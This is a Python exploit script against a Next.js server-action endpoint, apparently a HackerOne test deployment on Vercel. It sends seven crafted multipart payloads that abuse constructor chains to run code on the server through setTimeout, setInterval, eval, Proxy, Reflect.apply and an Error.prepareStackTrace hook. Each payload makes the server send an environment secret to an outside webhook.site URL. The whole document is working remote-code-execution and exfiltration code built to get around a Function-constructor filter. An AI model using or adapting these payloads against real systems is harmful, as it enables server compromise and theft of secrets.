#!/usr/bin/env python3
"""
Alternative code execution primitives that bypass Function constructor
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def try_primitive(payload_structure, label):
    """Try different primitive"""
    print(f"\n[*] {label}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    body = ''
    for key, value in payload_structure.items():
        body += f'------{boundary}\r\n'
        body += f'Content-Disposition: form-data; name="{key}"\r\n\r\n'
        if isinstance(value, (dict, list)):
            body += json.dumps(value)
        else:
            body += value
        body += '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    r = requests.post(TARGET, data=body, headers=headers, timeout=15)
    print(f"    Status: {r.status_code}")
    if r.status_code not in [403, 500]:
        print(f"    Response: {r.text[:500]}")
    return r

print("="*70)
print("Alternative Code Execution Primitives")
print("="*70)

# Primitive 1: setTimeout with string (not Function constructor)
payload1 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"setTimeout('require(\\'https\\').get(\\'{WEBHOOK}?p1=\\'+process.env.VERCEL_PLATFORM_PROTECTION)', 0)"
        }
    }
}
try_primitive(payload1, "setTimeout with string")

# Primitive 2: setInterval with string
payload2 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"setInterval('require(\\'https\\').get(\\'{WEBHOOK}?p2=\\'+process.env.VERCEL_PLATFORM_PROTECTION);clearInterval(this)', 100)"
        }
    }
}
try_primitive(payload2, "setInterval with string")

# Primitive 3: eval() directly
payload3 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"eval('require(\\'https\\').get(\\'{WEBHOOK}?p3=\\'+process.env.VERCEL_PLATFORM_PROTECTION)')"
        }
    }
}
try_primitive(payload3, "eval() directly")

# Primitive 4: new Function() via different path
payload4 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"(0,eval)('require(\\'https\\').get(\\'{WEBHOOK}?p4=\\'+process.env.VERCEL_PLATFORM_PROTECTION)')"
        }
    }
}
try_primitive(payload4, "Indirect eval (0,eval)")

# Primitive 5: Try accessing through Proxy
payload5 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"new Proxy({{}}, {{get:()=>require('https').get('{WEBHOOK}?p5='+process.env.VERCEL_PLATFORM_PROTECTION)}}).x"
        }
    }
}
try_primitive(payload5, "Proxy trap")

# Primitive 6: Use Reflect
payload6 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"Reflect.apply(require('https').get, null, ['{WEBHOOK}?p6='+process.env.VERCEL_PLATFORM_PROTECTION])"
        }
    }
}
try_primitive(payload6, "Reflect.apply")

# Primitive 7: Error.prepareStackTrace hook
payload7 = {
    "0": f"$F1#{ACTION_ID}#constructor",
    "1": {
        "constructor": {
            "constructor": f"""
Error.prepareStackTrace = (e, s) => require('https').get('{WEBHOOK}?p7='+process.env.VERCEL_PLATFORM_PROTECTION);
(new Error()).stack
"""
        }
    }
}
try_primitive(payload7, "Error.prepareStackTrace hook")

print("="*70)
